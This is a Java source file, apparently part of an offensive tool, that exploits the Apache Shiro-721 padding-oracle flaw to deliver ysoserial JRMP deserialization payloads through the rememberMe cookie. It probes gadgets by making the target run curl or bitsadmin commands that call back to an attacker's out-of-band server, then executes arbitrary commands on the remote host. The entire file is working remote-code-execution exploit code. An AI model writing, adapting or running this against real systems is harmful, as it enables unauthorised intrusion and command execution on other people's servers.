package com.shiroexploit.vulnverifier;

import com.shiroexploit.core.PaddingOracle;
import com.shiroexploit.util.*;
import java.io.File;
import java.io.IOException;
import java.util.*;

public class Shiro721VerifierWithJRMP implements Verifier {
    private Config config;
    private List<PayloadType> gadgets;
    private boolean flag;

    public Shiro721VerifierWithJRMP(){
        System.out.println("[*] Using Shiro721VerifierWithJRMP");
        this.config = Config.getInstance();
        this.gadgets = new ArrayList<>();
    }

    @Override
    public void getValidGadget() throws ExploitFailedException {
        for(PayloadType type : PayloadType.values()){

            System.out.println("[*] Trying Gadget: " + type.getName());
            //linux
            String uuid = UUID.randomUUID().toString().replaceAll("-", "");
            String command = "curl http://" + config.getOOBServerAddress() + ":" + config.getHTTPServicePort() + "/gadget?uuid=" + uuid + "%26type=" + type.getName();
            process(command, type);

            if(isValid(uuid)){
                this.gadgets.add(type);
                System.out.println("[+] Find Valid Gadget: " + type.getName());
                if(config.isSkipIfFound()){
                    break;
                }
            }

            //windows
            uuid = UUID.randomUUID().toString().replaceAll("-", "");
            command = "bitsadmin /rawreturn /transfer getfile http://" + config.getOOBServerAddress() + ":" + config.getHTTPServicePort()
                    + "/gadget?uuid=" + uuid + "%26type=" + type.getName() + " C:\\windows\\temp\\download_834723.tmp";
            process(command, type);

            if(isValid(uuid)){
                this.gadgets.add(type);
                System.out.println("[+] Find Valid Gadget: " + type.getName());
                if(config.isSkipIfFound()){
                    break;
                }
            }
        }

        this.flag = true;
        if(this.gadgets.size() == 0){
            throw new ExploitFailedException("[-] Can't find a valid gadget");
        }
    }

    @Override
    public void executeCmd(String cmd){

        for(PayloadType gadget : this.gadgets){
            System.out.println("[*] Using Gadget " + gadget.getName());
            System.out.println("[*] Executing command: " + cmd + "...");

            Tools.setJRMPServer(config.getOOBServerAddress(), config.getHTTPServicePort(), gadget, cmd);

            String command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar JRMPClient " + config.getOOBServerAddress() + ":" + config.getJRMPServicePort();
            byte[] result = Tools.exec(command);
            PaddingOracle paddingOracle = new PaddingOracle(config.getRequestInfo(), result);
            String rememberMe = null;
            try {
                rememberMe = paddingOracle.encrypt();
            } catch (ExploitFailedException e) {
                e.printStackTrace();
            }
            HttpRequest.request(config.getRequestInfo(), rememberMe);
            System.out.println("[+] Done");
        }
    }

    private void process(String command, PayloadType payloadType) throws ExploitFailedException {
        Tools.setJRMPServer(config.getOOBServerAddress(), config.getHTTPServicePort(), payloadType, command);

        command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar JRMPClient " + config.getOOBServerAddress() + ":" + config.getJRMPServicePort();
        byte[] payload = Tools.exec(command);
        PaddingOracle paddingOracle = new PaddingOracle(config.getRequestInfo(), payload);
        String rememberMe = paddingOracle.encrypt();
        HttpRequest.request(config.getRequestInfo(), rememberMe);

        try{
            Thread.sleep(config.getDelay() * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private boolean isValid(String uuid){
        String url = "http://" + config.getOOBServerAddress() + ":" + config.getHTTPServicePort() + "/result";
        String res = null;
        try {
            res = HttpRequest.request(url);
        } catch (IOException e) {
            res = "";
        }
        String[] uuids = res.trim().split(",");
        Set<String> validUUID = new HashSet<>(Arrays.asList(uuids));

        return  validUUID.contains(uuid);
    }
}
